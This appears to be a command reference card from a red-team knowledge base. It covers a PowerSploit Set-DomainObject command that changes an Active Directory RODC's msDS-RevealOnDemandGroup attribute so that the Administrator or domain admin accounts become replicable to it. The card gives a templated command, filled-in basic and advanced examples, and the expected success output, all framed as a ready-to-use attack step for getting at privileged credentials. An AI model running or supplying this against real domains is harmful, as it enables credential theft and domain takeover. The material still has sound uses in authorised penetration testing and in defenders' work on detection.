---
id: d0810f67-5026-465e-8e72-68bcecb8d1bb
name: set-domainobject-modify-rodc-attribute
type: command
executor: powershell
data: >-
  Set-DomainObject -Identity RODC$ -Set
  @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication
  Group,CN=Users,DC=domain,DC=local',
  'CN=Administrator,CN=Users,DC=domain,DC=local')}
output: null
created_at: '2023-04-06T03:56:08.358731+00:00'
updated_at: '2023-04-10T20:26:02.550837+00:00'
platforms:
  - Windows
tags:
  - Active Directory
  - PowerSploit
verified: true
validated: true
---

# set-domainobject-modify-rodc-attribute

## Command

```powershell
Set-DomainObject -Identity $_RODC_NAME -Set @{'msDS-RevealOnDemandGroup'=@('$_ALLOWED_GROUP_DN', '$_ADMIN_DN')}
```

## Description

This PowerSploit command modifies an Active Directory object, specifically the RODC computer account, by setting the msDS-RevealOnDemandGroup attribute to include specified DNs. It is used to force password replication for targeted accounts on the RODC.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Identity $_RODC_NAME | The name of the RODC computer object (e.g., RODC$) | Yes |
| -Set @{'msDS-RevealOnDemandGroup'=@('$_ALLOWED_GROUP_DN', '$_ADMIN_DN')} | Hashtable setting the attribute to an array of DNs (group and admin) | Yes |
| $_ALLOWED_GROUP_DN | DN of the Allowed RODC Password Replication Group (e.g., CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local) | Yes |
| $_ADMIN_DN | DN of the Domain Admin account (e.g., CN=Administrator,CN=Users,DC=domain,DC=local) | Yes |

## Examples

### Basic Usage

```powershell
Set-DomainObject -Identity RODC$ -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local', 'CN=Administrator,CN=Users,DC=domain,DC=local')}
```

### Advanced Usage

```powershell
Set-DomainObject -Identity BRANCH1-RODC$ -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication Group,CN=Users,DC=contoso,DC=com', 'CN=Domain Admin,CN=Users,DC=contoso,DC=com')}
```

## Expected Output

The command outputs a success message like:

```
The object RODC$ was modified successfully.
```

If there's an error (e.g., insufficient privileges), it will show an LDAP error code and description.

## Related

- [[procedures/Add-Domain-Admin-to-RODC-Password-Replication-Group]]
- [[commands/get-domainobject-rodc-query]]
